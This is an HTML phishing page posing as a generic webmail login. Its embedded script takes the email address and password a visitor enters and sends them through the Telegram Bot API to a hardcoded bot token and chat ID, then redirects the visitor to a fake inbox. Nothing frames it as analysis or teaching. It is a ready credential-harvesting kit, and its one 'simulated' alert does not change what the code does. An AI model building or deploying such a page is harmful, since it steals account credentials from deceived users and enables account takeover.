<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Webmail Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-container {
      background: white;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 400px;
    }
    h2 {
      text-align: center;
      margin-bottom: 24px;
    }
    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #0078D7;
      color: white;
      border: none;
      border-radius: 4px;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h2>Webmail Login</h2>
    <form id="loginForm">
      <input type="email" id="email" placeholder="Email Address" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="submit">Login</button>
    </form>
  </div>

  <script>
    const BOT_TOKEN = '7795670684:AAFsqmTLFdrKIQ9J69Lgtp9I3zvh3vrZeas';
    const CHAT_ID = '7790690548';

    document.getElementById('loginForm').addEventListener('submit', function (e) {
      e.preventDefault();

      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;

      const message = `🔐 Webmail Login Attempt:\n\n📧 Email: ${email}\n🔑 Password: ${password}`;

      fetch(`https://api.telegram.org/bot${AAFsqmTLFdrKIQ9J69Lgtp9I3zvh3vrZeas}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: 7790690548,
          text: message
        })
      }).then(response => {
        // Redirect or show a success message
        alert("Login sent (simulated). Redirecting...");
        window.location.href = "inbox.html";
      }).catch(error => {
        console.error('Error:', error);
      });
    });
  </script>
</body>
</html>
